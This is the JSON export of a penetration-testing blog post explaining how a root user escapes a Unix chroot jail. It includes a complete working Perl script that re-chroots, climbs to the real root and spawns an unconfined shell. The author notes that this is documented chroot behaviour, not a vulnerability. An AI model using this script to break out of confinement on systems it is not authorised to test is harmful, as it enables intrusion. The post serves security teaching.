{"id":28,"date":"2007-12-09T20:12:55","date_gmt":"2007-12-09T20:12:55","guid":{"rendered":"http:\/\/pentestmonkey.net\/?p=28"},"modified":"2011-08-20T15:55:29","modified_gmt":"2011-08-20T15:55:29","slug":"chroot-breakout-perl","status":"publish","type":"post","link":"https:\/\/pentestmonkey.net\/blog\/chroot-breakout-perl","title":{"rendered":"Breaking Out of a Chroot Jail Using PERL"},"content":{"rendered":"<p>I had cause to want to break out of a chroot&#8217;d environment recently.\u00a0 It is well known that if you&#8217;re root within the chroot environment you can break out of it.<\/p>\n<p>I set about learning how to break out of chroot and came across an <a href=\"http:\/\/www.bpfh.net\/simes\/computing\/chroot-break.html\">excellent description<\/a> by Simes from 2002.\u00a0 It contains a well documented C program that breaks out of the chroot environment.<\/p>\n<p>I wanted to use PERL to break out of the environment, as few chroot environments will contain a C compiler and you may not always be in a position to compile the above program for the OS and Architecture of your jail.<\/p>\n<p><!--more--><\/p>\n<h3>Recap: What is Chroot?<\/h3>\n<p>According to <a href=\"http:\/\/en.wikipedia.org\/wiki\/Chroot\">wikipedia:<\/a><\/p>\n<p><em>A chroot on Unix operating systems is an operation that changes the apparent disk root directory for the current running process and its children. A program that is re-rooted to another directory cannot access or name files outside that directory, called a chroot jail.<\/em><\/p>\n<p>You&#8217;re likely to come across chroot environments when testing web servers or FTP servers.\u00a0 Such services are exposed and therefore could be compromised.\u00a0 If you comrpomise a chroot&#8217;d HTTP or FTP daemon you will only gain access to the limited chroot environment.\u00a0 You will not be to access the real \/etc\/passwd for example.\u00a0 You would only be able to access \/some-path-you-dont-even-know-about\/etc\/passwd.\u00a0 Your process is trapped inside a directory structure that you can&#8217;t break out of.<\/p>\n<p>&#8230;unless you&#8217;re root.\u00a0 If you escalate your privileges to root within the jail, it is possible to get out.\u00a0 Your only obstacle is finding a way to make the &#8220;chroot&#8221; system call with the tools available to you inside the chroot jail &#8211; or uploading your own tools.\u00a0 Your options include:<\/p>\n<ul>\n<li>Compiling a program such as <a href=\"http:\/\/www.bpfh.net\/simes\/computing\/chroot-break.html\">this<\/a> on the target host &#8211; but you probably don&#8217;t have a C compiler in the chroot jail.<\/li>\n<li>\u00a0Uploading a precompiled chroot-escaper &#8211; if you have one for the target OS\/architecture.<\/li>\n<li>Using an installed scripting language (PERL, PHP, Python) &#8211; if there&#8217;s one installed<\/li>\n<\/ul>\n<h3>Overview of Breaking out of Chroot<\/h3>\n<p>The C program referenced about uses this technique:<\/p>\n<ol>\n<li>Open a file handle to the root of the jail<\/li>\n<li>Create a sub directory in the jail and chroot yourself there (you are root, so you are allowed to chroot).\u00a0 You&#8217;re now even deeper in the jail.<\/li>\n<li>Change directory using the file handle to the root of the old jail.\u00a0 You&#8217;re now outside of the chroot jail you created in the sub directory.\u00a0 You&#8217;re free!\u00a0 Well, kind of.\u00a0 Actually all locations starting with &#8216;\/&#8217; are still mapped to that sub directory.\u00a0 You don&#8217;t want this.<\/li>\n<li>cd ..; cd ..; &#8230;until you reach the real root.<\/li>\n<li>Chroot yourself in the real root.\u00a0 Now you&#8217;re properly free.<\/li>\n<\/ol>\n<h3>The PERL Script<\/h3>\n<p>Here&#8217;s a simple PERL implementation.\u00a0 It seems to work on Linux:<\/p>\n<pre>#!\/usr\/bin\/perl -w\r\nuse strict;\r\n# unchroot.pl Dec 2007\r\n# http:\/\/pentestmonkey.net\/blog\/chroot-breakout-perl\r\n\r\n# This script may be used for legal purposes only.\r\n\r\n# Go to the root of the jail\r\nchdir \"\/\";\r\n\r\n# Open filehandle to root of jail\r\nopendir JAILROOT, \".\" or die \"ERROR: Couldn't get file handle to root of jailn\";\r\n\r\n# Create a subdir, move into it\r\nmkdir \"mysubdir\";\r\nchdir \"mysubdir\";\r\n\r\n# Lock ourselves in a new jail\r\nchroot \".\";\r\n\r\n# Use our filehandle to get back to the root of the old jail\r\nchdir(*JAILROOT);\r\n\r\n# Get to the real root\r\nwhile ((stat(\".\"))[0] != (stat(\"..\"))[0] or (stat(\".\"))[1] != (stat(\"..\"))[1]) {\r\n        chdir \"..\";\r\n}\r\n\r\n# Lock ourselves in real root - so we're not really in a jail at all now\r\nchroot \".\";\r\n\r\n# Start an un-jailed shell\r\nsystem(\"\/bin\/sh\");<\/pre>\n<h3>So is this a Vulnerability?<\/h3>\n<p>To be clear, this is NOT a vulnerability. The root user is supposed to be able to change the root directory for the current process and for child processes. Chroot only jails non-root processes. Wikipedia clearly summarises the <a href=\"http:\/\/en.wikipedia.org\/wiki\/Chroot#Limitations\">limitations<\/a> of chroot.<\/p>\n<h3>Feedback<\/h3>\n<p>Thanks to <a href=\"http:\/\/www.nth-dimension.org.uk\/\">timb<\/a> for the suggestion to change this:<\/p>\n<pre>foreach my $count (1..100) {\r\n        chdir \"..\";\r\n}<\/pre>\n<p>To this (which checks if &#8216;.&#8217; and &#8216;..&#8217; are the same thing):<\/p>\n<pre>while ((stat(\".\"))[0] != (stat(\"..\"))[0] or (stat(\".\"))[1] != (stat(\"..\"))[1]) {\r\n        chdir \"..\";\r\n}<\/pre>\n<p>Much nicer. He even credited his source: &#8220;Solaris Systems Programming&#8221; by Rich Teer.<\/p>\n","protected":false},"excerpt":{"rendered":"<p>I had cause to want to break out of a chroot&#8217;d environment recently.\u00a0 It is well known that if you&#8217;re root within the chroot environment you can break out of it. I set about learning how to break out of chroot and came across an excellent description by Simes from 2002.\u00a0 It contains a well [&hellip;]<\/p>\n","protected":false},"author":3,"featured_media":0,"comment_status":"open","ping_status":"open","sticky":false,"template":"","format":"standard","meta":[],"categories":[5],"tags":[103,19,47],"_links":{"self":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/28"}],"collection":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/users\/3"}],"replies":[{"embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/comments?post=28"}],"version-history":[{"count":2,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/28\/revisions"}],"predecessor-version":[{"id":396,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/28\/revisions\/396"}],"wp:attachment":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/media?parent=28"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/categories?post=28"},{"taxonomy":"post_tag","embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/tags?post=28"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}